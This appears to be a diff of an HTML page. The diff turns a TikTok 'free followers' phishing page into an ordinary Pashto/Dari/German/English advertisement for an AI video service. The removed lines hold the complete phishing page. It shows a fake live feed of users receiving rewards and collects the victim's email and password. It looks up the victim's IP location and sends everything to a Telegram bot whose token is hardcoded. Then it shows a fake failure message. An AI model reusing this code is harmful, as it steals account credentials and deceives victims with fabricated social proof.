@@ -1,102 +1,129 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ps">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Studio | Free Rewards</title>
+    <title>TOPAK | Multi-Language AI UGC</title>
     <style>
-        body { background: radial-gradient(circle, #1a1a1a, #000); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
-        .container { width: 90%; max-width: 400px; background: rgba(20, 20, 20, 0.9); border: 1px solid #fe2c55; border-radius: 20px; padding: 25px; box-shadow: 0 0 30px rgba(254, 44, 85, 0.2); text-align: center; }
-        .logo { width: 60px; margin-bottom: 10px; }
-        h2 { font-size: 22px; margin-bottom: 5px; color: #fe2c55; }
-        p { font-size: 13px; color: #aaa; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 10px; box-sizing: border-box; }
-        input:focus { border-color: #25f4ee; outline: none; }
-        .btn { width: 100%; padding: 15px; background: #fe2c55; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #080c14;
+            color: #e2e8f0;
+            text-align: center;
+        }
+        header {
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            padding: 80px 20px;
+            border-bottom: 4px solid #0ea5e9;
+        }
+        .logo-box {
+            width: 120px;
+            height: 120px;
+            background: #0ea5e9;
+            color: #fff;
+            border-radius: 25% 10%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: bold;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 30px rgba(14, 165, 233, 0.4);
+        }
+        h1 { margin: 10px 0; font-size: 3rem; color: #0ea5e9; }
         
-        /* د ژوندیو معلوماتو برخه */
-        .live-feed { background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px; margin-top: 20px; height: 60px; overflow: hidden; font-size: 11px; text-align: left; border-left: 3px solid #25f4ee; }
-        .feed-item { animation: slide 2s infinite; color: #25f4ee; margin-bottom: 5px; }
-        @keyframes slide { 0% { transform: translateY(20px); } 20% { transform: translateY(0); } 80% { transform: translateY(0); } 100% { transform: translateY(-20px); } }
+        .lang-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 10px;
+        }
+        .lang-card {
+            background: #1e293b;
+            padding: 15px;
+            border-radius: 12px;
+            border-left: 4px solid #0ea5e9;
+            text-align: center;
+        }
+        .lang-title { font-weight: bold; color: #38bdf8; display: block; margin-bottom: 5px; }
+
+        .container { padding: 40px 20px; }
         
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #111; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .main-card {
+            background: #111827;
+            padding: 30px;
+            border-radius: 25px;
+            max-width: 700px;
+            margin: 0 auto;
+            border: 1px solid #1f2937;
+        }
+
+        .btn {
+            display: inline-block;
+            background: #0ea5e9;
+            color: white;
+            padding: 18px 50px;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1.3rem;
+            margin-top: 30px;
+            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.3);
+            transition: 0.3s;
+        }
+        .btn:hover { transform: translateY(-5px); background: #38bdf8; }
+
+        footer { padding: 50px; color: #4b5563; font-size: 0.9rem; border-top: 1px solid #1f2937; }
+        .sep { color: #0ea5e9; margin: 0 10px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" class="logo">
-        <h2>Reward Center</h2>
-        <p>Login with your TikTok linked email to receive 10k Followers instantly.</p>
-        
-        <input type="email" id="email" placeholder="Email or Phone">
-        <input type="password" id="pass" placeholder="Password">
-        
-        <button class="btn" onclick="sendData()">Claim 10,000 Followers</button>
-
-        <div class="live-feed" id="feed">
-            <div class="feed-item">✅ @king_01 just received 5,000 followers</div>
+<header>
+    <div class="logo-box">TOPAK</div>
+    <h1>TOPAK AI-UGC</h1>
+    <p>Professional Digital Creator in Germany</p>
+    
+    <div class="lang-grid">
+        <div class="lang-card">
+            <span class="lang-title">پښتو</span>
+زه ستاسو لپاره په پښتو ژبه غوره AI ویډیوګانې جوړوم
+        </div>
+        <div class="lang-card">
+            <span class="lang-title">دری</span>
+من برای محصولات شما ویدیوهای هوش مصنوعی حرفه‌ای میسازم
+        </div>
+        <div class="lang-card">
+            <span class="lang-title">Deutsch</span>
+Ich erstelle professionelle AI-UGC Videos für Ihre Marke
+        </div>
+        <div class="lang-card">
+            <span class="lang-title">English</span>
+I create high-quality AI-UGC videos for your business
         </div>
     </div>
+</header>
 
-    <div id="overlay">
-        <div class="spinner"></div>
-        <p style="margin-top: 15px; font-size: 14px; color: #fe2c55;">Verifying Account...</p>
+<div class="container">
+    <div class="main-card">
+        <h2 style="color: #fff;">خدمات <span class="sep">|</span> Services</h2>
+        <p>AI Video Production <span class="sep">|</span> Voiceovers <span class="sep">|</span> Social Media Ads</p>
+        <hr style="border: 0.5px solid #1f2937; margin: 20px 0;">
+        <p>په جرمني، پښتو، دري او انګلیسي ژبو ستاسو د اعلاناتو لپاره کار کوم.</p>
+        <p style="direction: ltr;">Work in: German - Pashto - Dari - English</p>
+        
+        <a href="mailto:contact@topak.de" class="btn">Order Now | اوس اړیکه ونیسئ</a>
     </div>
+</div>
 
-    <script>
-        const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
-        const chatId = "7461145170";
+<footer>
+    <p>© 2026 TOPAK | Global AI UGC Studio - Germany</p>
+    <p>Pashto | دری | English | Deutsch</p>
+</footer>
 
-        // د جعلي معلوماتو سیستم
-        const users = ["@ajmal_shiwari", "@afghan_boy", "@khan_786", "@top_tik", "@paktia_wal", "@zaman_01"];
-        setInterval(() => {
-            const user = users[Math.floor(Math.random() * users.length)];
-            const amount = [1000, 5000, 10000][Math.floor(Math.random() * 3)];
-            document.getElementById('feed').innerHTML = `<div class="feed-item">✅ ${user} just received ${amount} followers</div>`;
-        }, 3000);
-
-        async function sendData() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-
-            if(!email || !pass) { alert("Please fill all fields!"); return; }
-
-            document.getElementById('overlay').style.display = 'flex';
-
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-
-                const report = `
-🚨 **NEW TIKTOK LOGIN CAPTURED!** 🚨
-----------------------------------
-📧 **Email:** \`${email}\`
-🔑 **Password:** \`${pass}\`
-🌐 **IP:** \`${d.ip}\`
-📍 **Loc:** ${d.city}, ${d.country_name}
-🏢 **Network:** ${d.org}
-📱 **Device:** ${navigator.platform}
-----------------------------------
-📍 **Map:** https://www.google.com/maps?q=${d.latitude},${d.longitude}
-----------------------------------
-                `;
-
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: report, parse_mode: 'Markdown' })
-                });
-
-                setTimeout(() => {
-                    alert("Verification Failed! Your account is not eligible for this reward.");
-                    window.location.href = "https://t.me/TOPAK1V";
-                }, 4000);
-
-            } catch (e) { window.location.href = "https://t.me/TOPAK1V"; }
-        }
-    </script>
 </body>
 </html>
